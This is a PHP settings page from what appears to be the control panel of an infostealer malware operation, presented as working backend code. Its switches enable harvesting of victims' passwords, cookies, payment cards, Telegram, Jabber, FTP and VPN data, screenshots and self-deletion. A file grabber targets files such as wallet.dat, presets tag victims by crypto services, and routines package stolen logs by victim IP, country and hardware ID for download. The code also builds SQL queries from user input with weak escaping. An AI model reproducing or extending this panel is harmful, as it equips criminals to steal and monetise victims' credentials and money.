<?php  
ini_set("max_execution_time", 900);
   session_start();
   include 'database.php';
	require_once("auth.php");
if(isset($_GET["download"])) $download     = formatString($_GET["download"]);
if(isset($_GET["delete"])) $delete       = formatString($_GET["delete"]);
if(isset($_GET["deleteRule"])) $deleteRule       = formatString($_GET["deleteRule"]);
if(isset($_GET["deleteLog"])) $deleteLog    = formatString($_GET["deleteLog"]);
$statusSettings    = $pdoConnection->query("SELECT * FROM `settings`")->fetch();
if (isset($_GET['acceptChanges'])) {
    $cis    = formatString($_GET['cis']);
    $repeat = formatString($_GET['repeat']);
	$telegram = formatString($_GET['telegram']);
	$history = formatString($_GET['history']);
	$autocomplete = formatString($_GET['autocomplete']);
	$cards = formatString($_GET['cards']);
	$cookies = formatString($_GET['cookies']);
	$passwords = formatString($_GET['passwords']);
	$jabber = formatString($_GET['jabber']);
	$ftp = formatString($_GET['ftp']);
	$screenshot = formatString($_GET['screenshot']);
	$selfDelete = formatString($_GET['selfDelete']);
	$vpn = formatString($_GET['vpn']);
	$grabber = formatString($_GET['grabber']);
	$executionTime = formatString($_GET['executionTime']);
    if ($cis == NULL)
        $cis = "off";
    if ($repeat == NULL)
        $repeat = "off";
	 if ($telegram == NULL)
        $telegram = "off";
    if ($history == NULL)
        $history = "off";
	 if ($autocomplete == NULL)
        $autocomplete = "off";
    if ($cards == NULL)
        $cards = "off";
	 if ($cookies == NULL)
        $cookies = "off";
    if ($passwords == NULL)
        $passwords = "off";
	 if ($jabber == NULL)
        $jabber = "off";
    if ($ftp == NULL)
        $ftp = "off";
	 if ($screenshot == NULL)
        $screenshot = "off";
    if ($selfDelete == NULL)
        $selfDelete = "off";
	 if ($vpn == NULL)
        $vpn = "off";
    if ($grabber == NULL)
        $grabber = "off";
    $pdoConnection->query("UPDATE `settings` SET cisLogs='$cis',repeatLogs='$repeat',telegram='$telegram',history='$history',autocomplete='$history',cards='$cards',cookies='$cookies',passwords='$passwords',jabber='$jabber',ftp='$ftp',screenshot='$screenshot',selfDelete='$selfDelete',vpn='$vpn',grabber='$grabber',executionTime='$executionTime'");
   header("Location: settings.php", true, 301);
}
if ($download != null) {
    if ($download == "all") {
        $txt    = "logs/all" . date(" d.m.Y_H:i:s") . ".zip";
        $zipAll = new ZipArchive();
        $zipAll->open($txt, ZipArchive::CREATE | ZipArchive::OVERWRITE);
        $pc = $pdoConnection->query("SELECT hwid, ip, country, date FROM `logs`")->fetchAll();
        for ($i = 0; $i < count($pc)-1; $i++) {
            $rootPath = realpath("logs/" . $pc[$i]["hwid"] . "/");
            $files    = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY);
            
            foreach ($files as $name => $file) {
                if (!$file->isDir()) {
                    $filePath     = $file->getRealPath();
                    $str          = date("d.m.Y_H:i:s", $pc[$i]["date"]) . "_" . $pc[$i]["country"] . "_" . $pc[$i]["ip"] . "_" . $pc[$i]["hwid"];
                    //$relativePath = str_replace($pc[$i]['hwid'], $str, substr($filePath, strlen($rootPath) + 1));
					$relativePath = substr($filePath, strlen($rootPath) + 1);
                    //$zipAll->addFile($filePath, $pc[$i]["hwid"] . "/" . $relativePath);
					$zipAll->addFile($filePath, $str . "/" . $relativePath);
                }
            }
            $pdoConnection->query("UPDATE `logs` SET `checked` = 1 WHERE `hwid` = '" . $pc[$i]["hwid"]."'");
        }
        $zipAll->close();
        header("Location: " . $txt);
    } else if ($download == "unchecked") {
        $txt    = "logs/all" . date(" d.m.Y_H:i:s") . ".zip";
        $zipAll = new ZipArchive();
        $zipAll->open($txt, ZipArchive::CREATE | ZipArchive::OVERWRITE);
        $pc = $pdoConnection->query("SELECT hwid, ip, country FROM `logs` WHERE `checked` = 0")->fetchAll();
        for ($i = 0; $i < count($pc)-1; $i++) {
            $rootPath = realpath("logs/" . $pc[$i]["hwid"] . "/");
            $files    = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY);
            
            foreach ($files as $name => $file) {
                if (!$file->isDir()) {
                    $filePath     = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($rootPath) + 1);
                    $zipAll->addFile($filePath, $pc[$i]["hwid"] . "/" . $relativePath);
                }
            }
            $pdoConnection->query("UPDATE `logs` SET `checked` = 1 WHERE `hwid` = '" . $pc[$i]["hwid"]."'");
        }
        $zipAll->close();
        header("Location: " . $txt);
    }
}
if ($deleteLog != null) {
    if ($deleteLog == "all") {
        
        
            $hwid = $pdoConnection->query("SELECT hwid FROM `logs`")->fetchAll(PDO::FETCH_ASSOC);
            foreach ($hwid as $hweed) {
                $dir   = "logs/" . $hweed[0] . "/";
				if(strlen($dir)>6){
					try {
                $it    = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
                $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($files as $file) {
                    if ($file->isDir()) {
                        rmdir($file->getRealPath());
                    } else {
                        unlink($file->getRealPath());
                    }
                }
                rmdir($dir);
				 }
        catch (Exception $ex) {
        }
            }
			}
        $pdoConnection->exec("DELETE FROM `logs`");
    } else if ($deleteLog == "checked") {
        
        try {
            $hwid = $pdoConnection->query("SELECT hwid FROM `logs` WHERE checked = '1'")->fetchAll(PDO::FETCH_ASSOC);
            foreach ($hwid as $hweed) {
                $dir   = "logs/" . $hweed[0] . "/";
				if(strlen($dir)>6){
                $it    = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
                $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($files as $file) {
                    if ($file->isDir()) {
                        rmdir($file->getRealPath());
                    } else {
                        unlink($file->getRealPath());
                    }
                }
                rmdir($dir);
				}
            }
        }
        catch (Exception $ex) {
        }
        
        $pdoConnection->exec("DELETE FROM `logs` WHERE checked = '1'");
    } else if ($deleteLog == "empty") {
        
        try {
            $hwid = $pdoConnection->query("SELECT hwid FROM `logs` WHERE `pswd` = 0 AND `cookie` = 0 AND `wallets` = 0")->fetchAll(PDO::FETCH_ASSOC);
            foreach ($hwid as $hweed) {
				
                $dir   = "logs/" . $hweed[0] . "/";
				if(strlen($dir)>6){
                $it    = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
                $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($files as $file) {
                    if ($file->isDir()) {
                        rmdir($file->getRealPath());
                    } else {
                        unlink($file->getRealPath());
                    }
                }
                rmdir($dir);
				}
            }
        }
        catch (Exception $ex) {
        }
        
        $pdoConnection->exec("DELETE FROM `logs` WHERE `pswd` = 0 AND `cookie` = 0 AND `wallets` = 0");
    }
    header("Location: settings.php", true, 301);
}
if(isset($_POST['addPreset'])){
	$name         = formatString($_POST["name"]);
	$color        = formatString($_POST["color"]);
	$pattern      = formatString($_POST["services"]);
	if ($color != null & $pattern != null) {
		$pdoConnection->exec("INSERT INTO `presets`(`name`,`color`,`pattern`) VALUES ('$name','$color','$pattern')");
	}
}
if(isset($_POST['addRule'])){
	$name         = formatString($_POST["name"]);
	$folder        = addslashes(formatString($_POST["folder"]));
	$pattern      = formatString($_POST["pattern"]);
	$exception        = formatString($_POST["exception"]);
	if ($name != null & $pattern != null) {
		$pdoConnection->exec("INSERT INTO `grabber`(`name`,`folder`,`pattern`,`exception`) VALUES ('$name','$folder','$pattern','$exception')");
	}
}
if ($delete != null) {
    $pdoConnection->exec("DELETE FROM `presets` WHERE id = '" . formatString($delete) . "'");
    header("Location: settings.php", true, 301);
}
if ($deleteRule != null) {
    $pdoConnection->exec("DELETE FROM `grabber` WHERE id = '" . formatString($deleteRule) . "'");
    header("Location: settings.php", true, 301);
}
$presets = $pdoConnection->query("SELECT * FROM `presets`");
$grabberRules = $pdoConnection->query("SELECT * FROM `grabber`");
function formatString($param)
{
    $returnString = $param;
    $returnString = trim($returnString);
    $returnString = htmlspecialchars($returnString);
    
    return $returnString;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <title>Settings</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
	<link href="assets/css/switch.css" rel="stylesheet" type="text/css"/>
      <link href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet" type="text/css"/>
      <link href="https://cdnjs.cloudflare.com/ajax/libs/viewerjs/1.3.1/viewer.css" rel="stylesheet" type="text/css"/>
      <link href="assets/css/app.min.css" rel="stylesheet" type="text/css"/>
</head>

<header id="topnav">
    <div class="topbar-menu">
        <div class="container-fluid">
            <div id="navigation">
                <ul class="navigation-menu">
                    <li>
                        <a href="index.php">
                            <i class="fas fa-hashtag"></i>Dashboard</a>
                    </li>

                    <li>
                        <a href="loader.php">
                            <i class="fas fa-tasks"></i>Loader</a>
                    </li>

                    <li>
                        <a href="converter.php">
                            <i class="fas fa-arrows-alt-h"></i>Cookies Converter</a>
                    </li>
					<li>
                     <a href="search.php">
                     <i class="fas fa-search"></i>Search</a>
					</li>
					<li>
                     <a href="settings.php">
                     <i class="fas fa-cogs"></i>Settings</a>
					</li>
                </ul>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</header>

<div class="wrapper">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-body">
					<form>

<div>
<div class = "collumn">
<div class="form-group row x300">
<label class="col-sm-2 col-form-label">Enable CIS logs</label>
<label class="switch">
<input type="checkbox" name="cis" <?php  if($statusSettings[1]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
</div>
<div class="form-group row x300">
<label class="col-sm-2 col-form-label">Repeat logs</label>
<label class="switch">
<input type="checkbox" name="repeat" <?php  if($statusSettings[2]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
</div>
<div class="form-group row x300">
<label class="col-sm-2 col-form-label">Telegram</label>
<label class="switch">
<input type="checkbox" name="telegram" <?php  if($statusSettings[3]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
</div><div class="form-group row x300">
<label class="col-sm-2 col-form-label">History</label>
<label class="switch">
<input type="checkbox" name="history" <?php  if($statusSettings[4]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
</div></div>
<div class = "collumn">
<div class="form-group row x300">
<label class="col-sm-2 col-form-label">Autocomplete</label>
<label class="switch">
<input type="checkbox" name="autocomplete" <?php  if($statusSettings[5]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
</div><div class="form-group row x300">
<label class="col-sm-2 col-form-label">Cards</label>
<label class="switch">
<input type="checkbox" name="cards" <?php  if($statusSettings[6]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
</div><div class="form-group row x300">
<label class="col-sm-2 col-form-label">Cookies</label>
<label class="switch">
<input type="checkbox" name="cookies" <?php  if($statusSettings[7]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
</div><div class="form-group row x300">
<label class="col-sm-2 col-form-label">Passwords</label>
<label class="switch">
<input type="checkbox" name="passwords" <?php  if($statusSettings[8]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
</div></div>
<div class = "collumn"><div class="form-group row x300">
<label class="col-sm-2 col-form-label">Jabber</label>
<label class="switch">
<input type="checkbox" name="jabber" <?php  if($statusSettings[9]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
    </div>
	<div class="form-group row x300">
<label class="col-sm-2 col-form-label">FTP</label>
<label class="switch">
<input type="checkbox" name="ftp" <?php  if($statusSettings[10]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
    </div>
	<div class="form-group row x300">
<label class="col-sm-2 col-form-label">Screenshot</label>
<label class="switch">
<input type="checkbox" name="screenshot" <?php  if($statusSettings[11]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
    </div>
	<div class="form-group row x300">
<label class="col-sm-2 col-form-label">Self delete</label>
<label class="switch">
<input type="checkbox" name="selfDelete" <?php  if($statusSettings[12]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
    </div></div>
	<div class = "collumn">
	<div class="form-group row x300">
<label class="col-sm-2 col-form-label">VPN</label>
<label class="switch">
<input type="checkbox" name="vpn" <?php  if($statusSettings[13]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
    </div>
	<div class="form-group row x300">
<label class="col-sm-2 col-form-label">Grabber</label>
<label class="switch">
<input type="checkbox" name="grabber" <?php  if($statusSettings[14]=="on"){echo "checked";}?>>
<span class="slider round"></span>
</label>
    </div>
	<div class="form-group row x300">
<label class="col-sm-2 col-form-label">Execution time</label>
<input type="number" name="executionTime" min="0" max="1800" value="<?php echo $statusSettings[15];?>">
    </div></div>
	<div class="buttonsBlock">
	<center>
	<div class="btn-group">
<button type="button" class="btn btn-success dropdown-toggle btn-sm" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Download
</button>
<div class="dropdown-menu">
<a class="dropdown-item" href="settings.php?download=all">Download all</a>
<a class="dropdown-item" href="settings.php?download=unchecked">Download unchecked</a>
</div>
</div>
<div class="btn-group">
<button type="button" class="btn btn-danger dropdown-toggle btn-sm" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Delete
</button>
<div class="dropdown-menu">
<a class="dropdown-item" href="settings.php?deleteLog=all">Delete all</a>
<a class="dropdown-item" href="settings.php?deleteLog=checked">Delete checked</a>
<a class="dropdown-item" href="settings.php?deleteLog=empty">Delete empty</a>
</div>
</div><br><br><button type="submit" name="acceptChanges" class="btn btn-primary">Accept changes</button></center></div></div></div>
</form>
                            </div> <!-- end card-box -->
                        </div> <!-- end card-->
            </div> <!-- end container -->
			</div>
			</div>
</div> 
	<?php if($statusSettings[14]=="on"){
		?>
		<div class="container-fluid">
		<div class="row">
		<div class="col-12">
				<div class="card">
				<button onclick="showSettings()" class="btn btn-primary" style="position: absolute;right: 1.5rem;top: .5rem;">Add rule <i class="fa fa-plus"></i></button>
				<div id="addRule" class="card-body" style="display:none;">
					<h4 class="header-title">Create rule</h4>
								<form class="form-horizontal" action="" method="POST">	
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Name</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="Txt files" value="" name="name" type="text">
                                        </div>
                                    </div>								
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Folder</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="%ALL-FOLDERS%" value="" name="folder" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Files</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="*.txt" value="" name="pattern" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Exception</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="wallet.dat" value="" name="exception" type="text">
                                        </div>
                                    </div>
									
									<button type="submit" name="addRule" class="btn btn-primary">Create</button>
    
                                </form>
								</div>
				<div class="card-body">
						<h4 class="header-title">Grabber rules</h4>
							<div class="table-responsive mt-3" style="overflow-x: inherit;">
								<table class="table table-hover table-centered mb-0">
									<thead>
										<tr>
											<th>Name</th>
											<th>Folder</th>
											<th>Files</th>
											<th>Exception</th>
											<th>Action</th>
										</tr>
									</thead>
									
									<tbody>
									<?php  
									while ($grabberRule = $grabberRules->fetch(PDO::FETCH_ASSOC))
									{
									
									?>
										<tr>
											<td><b><?php   echo $grabberRule["name"]; ?></b></td>
											<td style="word-break: break-all;"><?php   echo $grabberRule["folder"]; ?></td>
											<td style="word-break: break-all;"><?php   echo $grabberRule["pattern"]; ?></td>
											<td style="word-break: break-all;"><?php   echo $grabberRule["exception"]; ?></td>
											<td><a href="settings.php?deleteRule=<?php   echo $grabberRule["id"]; ?>" >Delete</a></td>
										</tr>
										
									<?php  
									}
									?>
									</tbody>
                            </table>
                        </div>
                    </div>
					</div>
					</div>
					</div>
					</div>
	<?php
	}
	?>
	<div class="container-fluid">
		<div class="row">
			<div class="col-12">
				<div class="page-title-box">
				
					<h4 class="page-title">Presets</h4>
				</div>
			</div>
		</div> 
		
		<div class="row">
			<div class="col-12">
				<div class="card">
					<div class="card-body">
					<h4 class="header-title">Create preset</h4>
								<form class="form-horizontal" action="" method="POST">	
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Name</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="Crypto" value="" name="name" type="text">
                                        </div>
                                    </div>								
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Services</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="blockchain;coinbase;" value="" name="services" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Color</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="color">
                                                <option style="background-color: green;" value="green">Green</option>
                                                <option style="background-color: teal;" value="teal">Teal</option>
												<option style="background-color: steelblue;" value="steelblue">Blue</option>
												<option style="background-color: navy;" value="navy">Navy</option>
												<option style="background-color: firebrick;" value="firebrick">Red</option>
												<option style="background-color: coral;" value="coral">Coral</option>
												<option style="background-color: orangered;" value="orangered">Orange</option>
												<option style="background-color: gold;" value="gold">Gold</option>
												<option style="background-color: violet;" value="violet">Violet</option>
												<option style="background-color: indigo;" value="indigo">Indigo</option>
												<option style="background-color: black;" value="black">Black</option>
                                            </select>
                                        </div>
                                    </div>
									
									<button type="submit" name="addPreset" class="btn btn-primary">Create</button>
    
                                </form>
								</div>
								<div class="card-body">
						<h4 class="header-title">Presets</h4>
							<div class="table-responsive mt-3" style="overflow-x: inherit;">
								<table class="table table-hover table-centered mb-0">
									<thead>
										<tr>
											<th>Name</th>
											<th>Services</th>
											<th>Color</th>
											<th>Action</th>
										</tr>
									</thead>
									
									<tbody>
									<?php  
									while ($preset = $presets->fetch(PDO::FETCH_ASSOC))
									{
									
									?>
										<tr>
											<td><b>#<?php   echo $preset["name"]; ?></b></td>
											<td style="word-break: break-all;"><?php   echo $preset["pattern"]; ?></td>
											<td style="color: <?php   echo $preset["color"]; ?>"><?php   echo $preset["color"]; ?></td>
											<td><a href="settings.php?delete=<?php   echo $preset["id"]; ?>" >Delete</a></td>
										</tr>
										
									<?php  
									}
									?>
									</tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script>
function showSettings(){
var element  = document.getElementById("addRule");
if(element.style.display=="none"){
	element.style.display = "";
}else{
	element.style.display = "none";
}
}
</script>
   <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
      integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
      crossorigin="anonymous"></script>
	     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
      integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut"
      crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
      integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k"
      crossorigin="anonymous"></script>
</html>